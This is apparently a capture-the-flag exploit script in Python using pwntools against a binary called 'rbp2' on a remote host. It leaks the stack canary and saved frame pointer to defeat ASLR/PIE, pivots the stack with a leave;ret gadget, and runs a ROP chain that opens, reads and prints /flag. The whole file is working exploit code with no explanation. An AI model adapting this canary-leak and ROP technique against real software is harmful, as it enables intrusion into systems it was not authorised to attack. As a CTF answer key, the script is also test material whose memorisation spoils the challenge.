#!/usr/bin/env python3
from pwn import *

context.binary = e = ELF("./rbp2", checksec=False)
context.log_level = "error"
HOST, PORT = "109.233.56.90", 11615

CSU = 0x1330
LEAVE_RET = 0x1298
POP_RDI = 0x138b
POP_RSI_R15 = 0x1389
POP_RDX = 0x129a
PLT_OPEN = 0x10c0
PLT_READ = 0x1090
PLT_WRITE = 0x1040
BUF2 = 0x40c0
READBUF = 0x4900


def attempt(fd):
    io = remote(HOST, PORT)
    try:
        io.recvuntil(b"familiar!\n")
        io.send(b"A" * 10 + b"\xff")
        body = io.recvuntil(b"Are you sure?", drop=True)[10:]
        canary = u64(b"\x00" + body[1:8])
        saved_rbp = u64(body[8:14].ljust(8, b"\x00"))
        pie = saved_rbp - CSU
        if pie & 0xfff:
            return None

        buf2, readbuf = pie + BUF2, pie + READBUF
        path = buf2 + 0xb8
        R = lambda o: p64(pie + o)

        p1 = b"A"*10 + p64(canary) + p64(buf2) + p64(pie + LEAVE_RET)[:7]
        assert len(p1) == 33

        chain = p64(0)
        chain += R(POP_RDI) + p64(path) + R(POP_RSI_R15) + p64(0) + p64(0)
        chain += R(PLT_OPEN)
        chain += R(POP_RDI) + p64(fd) + R(POP_RSI_R15) + p64(readbuf) + p64(0)
        chain += R(POP_RDX) + p64(0x60) + R(PLT_READ)
        chain += R(POP_RDI) + p64(1) + R(POP_RSI_R15) + p64(readbuf) + p64(0)
        chain += R(POP_RDX) + p64(0x60) + R(PLT_WRITE)
        chain = chain.ljust(0xb8, b"\x00") + b"/flag\x00"

        if b"\n" in p1 or b"\n" in chain:
            return None

        io.send(p1)
        io.sendline(chain)
        data = io.recvrepeat(1.5)
        m = re.search(rb"spbctf\{[^}]*\}", data)
        return m.group(0).decode() if m else None
    finally:
        io.close()


flag = None
for fd in (3, 4, 5, 6, 7):
    for _ in range(6):
        try:
            flag = attempt(fd)
        except (EOFError, PwnlibException):
            flag = None
        if flag:
            break
    if flag:
        log.success("fd=%d FLAG: %s", fd, flag)
        print(flag)
        break

if not flag:
    log.failure("no flag")
